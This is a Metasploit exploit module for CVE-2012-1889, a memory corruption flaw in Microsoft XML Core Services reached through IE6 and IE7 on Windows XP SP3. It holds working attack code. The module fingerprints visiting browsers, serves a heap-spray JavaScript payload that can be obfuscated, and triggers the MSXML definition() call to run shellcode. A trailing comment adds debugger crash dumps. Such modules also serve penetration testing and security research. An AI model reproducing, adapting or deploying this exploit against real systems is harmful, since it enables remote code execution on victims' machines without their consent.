##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({
    :ua_name    => HttpClients::IE,
    :ua_minver  => "6.0",
    :ua_maxver  => "7.0",
    :javascript => true,
    :os_name    => OperatingSystems::WINDOWS,
    :classid    => "{f6D90f11-9c73-11d3-b32e-00C04f990bb4}",
    :method     => "definition",
    :rank       => NormalRanking
  })

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Microsoft XML Core Services MSXML Uninitialized Memory Corruption",
      'Description'    => %q{
          This module exploits a memory corruption flaw in Microsoft XML Core Services
        when trying to access an uninitialized Node with the getDefinition API, which
        may corrupt memory allowing remote code execution. At the moment, this module
        only targets Microsoft XML Core Services 3.0 via IE6 and IE7 over Windows XP SP3.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'sinn3r',  # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-1889' ],
          [ 'OSVDB', '82873'],
          [ 'URL', 'http://technet.microsoft.com/en-us/security/advisory/2719615' ],
          [ 'URL', 'http://www.zdnet.com/blog/security/state-sponsored-attackers-using-ie-zero-day-to-hijack-gmail-accounts/12462' ]
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00",
          'Space'    => 1024
        },
      'DefaultOptions'  =>
        {
          'ExitFunction'         => "none",
          'InitialAutoRunScript' => 'migrate -f'
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # msxml3.dll 8.90.1101.0
          [ 'Automatic', {} ],
          [ 'IE 6 on Windows XP SP3', { 'Offset' => '0x800 - code.length' } ],
          [ 'IE 7 on Windows XP SP3', { 'Offset' => '0x800 - code.length' } ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Jun 12 2012",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])
      ], self.class)
  end

  def get_target(agent)
    #If the user is already specified by the user, we'll just use that
    return target if target.name != 'Automatic'

    if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
      return targets[1]  #IE 6 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
      return targets[2]  #IE 7 on Windows XP SP3
    else
      return nil
    end
  end

  def on_request_uri(cli, request)
    agent = request.headers['User-Agent']
    my_target = get_target(agent)

    # Avoid the attack if the victim doesn't have the same setup we're targeting
    if my_target.nil?
      print_error("#{cli.peerhost}:#{cli.peerport} - Browser not supported: #{agent.to_s}")
      send_not_found(cli)
      return
    end

    # Set payload depending on target
    p = payload.encoded

    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(target.arch))

    js = <<-JS
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");

    while (nops.length < 0x80000) nops += nops;
    var offset = nops.substring(0, #{my_target['Offset']});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);

    heap_obj.gc();

    for (var i=1; i < 0xa70; i++) {
      heap_obj.alloc(block);
    }

    JS

    js = heaplib(js, {:noobfu => true})

    if datastore['OBFUSCATE']
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    object_id = rand_text_alpha(4)

    html = <<-EOS
    <html>
    <head>
    <script>
    #{js}
    </script>
    </head>
    <body>
    <object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="#{object_id}"></object><script>
    document.getElementById("#{object_id}").object.definition(#{rand(1000)+1});
    </script>
    </body>
    </html>
    EOS

    html = html.gsub(/^\t/, '')

    print_status("#{cli.peerhost}:#{cli.peerport} - Sending html")
    send_response(cli, html, {'Content-Type'=>'text/html'})

  end

end

=begin

* Crash on Windows XP SP3 - msxml3.dll 8.90.1101.0

(e34.358): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=7498670c ebx=00000000 ecx=5f5ec68b edx=00000001 esi=7498670c edi=0013e350
eip=749bd772 esp=0013e010 ebp=0013e14c iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
msxml3!_dispatchImpl::InvokeHelper+0xb4:
749bd772 ff5118          call    dword ptr [ecx+18h]  ds:0023:5f5ec6a3=????????


0:008> r
eax=020bf2f0 ebx=00000000 ecx=00000000 edx=00000001 esi=020bf2f0 edi=020bf528
eip=749bd772 esp=020bf1a8 ebp=020bf2e4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
msxml3!_dispatchImpl::InvokeHelper+0xb4:
749bd772 ff5118          call    dword ptr [ecx+18h]  ds:0023:00000018=????????
0:008> k
ChildEBP RetAddr  
020bf2e4 749bdb13 msxml3!_dispatchImpl::InvokeHelper+0xb4
020bf320 749d4d84 msxml3!_dispatchImpl::Invoke+0x5e
020bf360 749dcae4 msxml3!DOMNode::Invoke+0xaa
020bf394 749bd5aa msxml3!DOMDocumentWrapper::Invoke+0x50
020bf3f0 749d6e6c msxml3!_dispatchImpl::InvokeEx+0xfa
020bf420 633a6d37 msxml3!_dispatchEx<IXMLDOMNode,&LIBID_MSXML2,&IID_IXMLDOMNode,0>::InvokeEx+0x2d
020bf460 633a6c75 jscript!IDispatchExInvokeEx2+0xf8
020bf49c 633a9cfe jscript!IDispatchExInvokeEx+0x6a
020bf55c 633a9f3c jscript!InvokeDispatchEx+0x98
020bf590 633a77ff jscript!VAR::InvokeByName+0x135
020bf5dc 633a85c7 jscript!VAR::InvokeDispName+0x7a
020bf60c 633a9c0b jscript!VAR::InvokeByDispID+0xce
020bf7a8 633a5ab0 jscript!CScriptRuntime::Run+0x2989
020bf890 633a59f7 jscript!ScrFncObj::CallWithFrameOnStack+0xff
020bf8dc 633a5743 jscript!ScrFncObj::Call+0x8f
020bf958 633891f1 jscript!CSession::Execute+0x175
020bf9a4 63388f65 jscript!COleScript::ExecutePendingScripts+0x1c0
020bfa08 63388d7f jscript!COleScript::ParseScriptTextCore+0x29a
020bfa30 635bf025 jscript!COleScript::ParseScriptText+0x30
020bfa88 635be7ca mshtml!CScriptCollection::ParseScriptText+0x219

=end
